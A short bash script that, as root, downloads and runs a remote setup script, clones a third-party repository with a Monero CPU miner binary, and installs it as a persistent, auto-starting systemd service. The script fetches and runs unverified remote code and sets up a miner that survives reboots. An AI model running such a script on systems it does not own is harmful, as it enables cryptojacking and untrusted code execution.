#!/bin/bash

cd /root/ && apt-get install git && wget https://raw.githubusercontent.com/jceminer/cn_cpu_miner/master/configure-huge-memory-pages.sh && chmod +x configure-huge-memory-pages.sh && ./configure-huge-memory-pages.sh && git clone https://github.com/nokian5500/monero.git && cd /root/monero && chmod +x jce64 && chmod +x jce64.service && chmod 777 serviceconfig.txt && mv jce64.service /lib/systemd/system && systemctl daemon-reload && systemctl enable jce64.service && systemctl start jce64.service && ./jce64

